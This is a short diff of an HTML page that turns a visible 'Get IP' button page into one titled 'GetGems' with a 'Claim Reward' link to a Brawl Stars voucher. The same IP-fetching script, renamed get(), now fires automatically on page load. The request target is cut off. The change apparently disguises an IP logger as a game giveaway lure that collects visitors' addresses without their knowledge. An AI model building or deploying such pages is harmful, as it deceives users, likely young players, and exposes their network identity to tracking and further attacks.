@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Client IP</title>
+    <title>GetGems</title>
 </head>
-<body>
-    <button onclick="getClientIP()">Get IP</button>
+<body onload="get()">
+    <a class="styles_button__DNJ4N button" href="brawlstars://action=voucher&amp;code=b647c71d-41a5-42c4-a10f-8d47952d82f3" data-testid="open-game-button"><span>Claim Reward</span></a>
     <script>
-        function getClientIP(){
+        function get(){
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == XMLHttpRequest.DONE) {
